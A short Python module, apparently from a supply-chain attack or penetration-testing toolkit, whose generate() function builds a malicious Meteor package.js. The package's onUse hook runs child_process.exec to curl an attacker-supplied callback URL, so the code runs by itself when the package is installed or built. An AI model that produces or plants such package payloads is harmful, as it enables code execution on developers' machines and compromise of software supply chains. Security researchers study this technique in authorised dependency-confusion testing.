"""Generate Meteor package payload."""
from __future__ import annotations

from typing import Optional


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a simple package.js executing ``callback``."""
    cmd = f"curl -m5 {callback}"
    return (
        f"Package.describe({{name: '{package}', version: '0.0.1'}})\n"
        "Package.onUse(function(api) {\n"
        f"  Npm.require('child_process').exec('{cmd}');\n"
        "})\n"
    )
